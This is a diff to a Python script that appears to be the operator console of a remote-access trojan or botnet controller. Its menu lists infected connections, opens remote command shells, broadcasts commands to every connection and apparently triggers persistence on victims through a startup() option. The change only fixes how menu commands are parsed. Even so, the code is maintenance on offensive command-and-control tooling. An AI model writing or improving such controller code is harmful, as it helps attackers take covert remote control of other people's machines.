@@ -76,7 +76,7 @@ def _decode(data):
 
 
 def menu_help():
-    print("\n H help")
+    print("\nH help")
     print("L List all connections")
     print("I Interact with connection")
     print("E Open remote cmd with connection")
@@ -94,15 +94,15 @@ def main_menu():
         if strChoice == "l":
             list_connections()
 
-        elif strChoice[:3] == "i" and len(strChoice) > 3:
-            conn = select_connection(strChoice[4:], True)
+        elif strChoice[:1] == "i" and len(strChoice) > 1:
+            conn = select_connection(strChoice[2:], True)
             if conn is not None:
                 send_commands()
         elif strChoice == "h":
             menu_help()
 
-        elif strChoice[:3] == "c" and len(strChoice) > 3:
-            conn = select_connection(strChoice[4:], False)
+        elif strChoice[:1] == "c" and len(strChoice) > 1:
+            conn = select_connection(strChoice[2:], False)
             if conn is not None:
                 send(b"exit")
                 conn.close()
@@ -111,13 +111,13 @@ def main_menu():
             close()
             break  # break to continue work() function
 
-        elif strChoice[:3] == "e" and len(strChoice) > 3:
-            conn = select_connection(strChoice[4:], False)
+        elif strChoice[:1] == "e" and len(strChoice) > 1:
+            conn = select_connection(strChoice[2:], False)
             if conn is not None:
                 command_shell()
 
-        elif strChoice[:3] == "s" and len(strChoice) > 3:
-            send_command_all(strChoice[4:])
+        elif strChoice[:1] == "s" and len(strChoice) > 1:
+            send_command_all(strChoice[2:])
         else:
             print("Invalid choice, please try again!")
             menu_help()
@@ -440,8 +440,8 @@ def send_commands():
                 send(b"exit")
                 conn.close()
                 break
-            elif strChoice[:3] == "m" and len(strChoice) > 3:
-                strMsg = "msg" + strChoice[4:]
+            elif strChoice[:1] == "m" and len(strChoice) > 1:
+                strMsg = "msg" + strChoice[2:]
                 send(strMsg.encode())
             elif strChoice == "a 1":
                 startup()
